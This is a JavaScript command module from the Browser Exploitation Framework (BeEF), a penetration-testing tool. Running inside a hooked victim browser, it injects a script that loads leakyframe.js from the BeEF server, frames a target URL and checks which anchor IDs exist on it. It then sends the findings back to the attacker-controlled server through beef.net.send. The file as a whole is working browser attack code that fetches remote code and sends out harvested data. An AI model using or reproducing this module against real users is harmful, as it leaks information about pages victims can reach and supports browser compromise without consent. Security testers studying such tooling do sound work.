//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


beef.execute(function() {
  var inputURL = '<%= @inputUrl %>';
  var anchorsToCheck = '<%= @anchorsToCheck %>';
  var arrayOfAnchorsToCheck = [];

  //the anchors should be seperated with ','
  //remove tabs, newlines, carriage returns and spaces
  anchorsToCheck = anchorsToCheck.replace(/[ \t\r\n]/g,'');
  arrayOfAnchorsToCheck = anchorsToCheck.split(',');

  var resultList = [];
  var resultString = '';
 
  //check if the leakyframe library is loaded
  //if not add it to the DOM 
  if (typeof LeakyFrame !== 'function'){
    var leakyscript = document.createElement('script');

    leakyscript.setAttribute('type', 'text/javascript');
    leakyscript.setAttribute('src', 'http://'+beef.net.host+':'+beef.net.port+'/leakyframe.js');
    var theparent = document.getElementsByTagName('head')[0];
    theparent.insertBefore(leakyscript, theparent.firstChild);
  }

  var timeout = 100;
  
  //give the DOM some time to load the library
  poll = function(){
    setTimeout(function(){
      timeout--; 
        if (typeof LeakyFrame === 'function') {
          new LeakyFrame(inputURL, 
            function(frame){
              //check each anchor
              for (var anchor = 0; anchor < arrayOfAnchorsToCheck.length; anchor++){
                if (frame.checkID(arrayOfAnchorsToCheck[anchor])){
                  resultList.push('Exists');
                }
                else{
                  resultList.push('Does not exist');
                }
              }
              frame.remove();

              //create the resultstring	
              for (var i = 0; i < resultList.length; i++){
                resultString = resultString + '#' + arrayOfAnchorsToCheck[i] + ' ' + resultList[i] + '; ';
              }

              beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result: ' + resultString);
            },false);
          }
          else if (timeout > 0){
            poll();
          }
          else {
            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'time-out occured!');
          }
       }, 100);
    };

  poll();
});

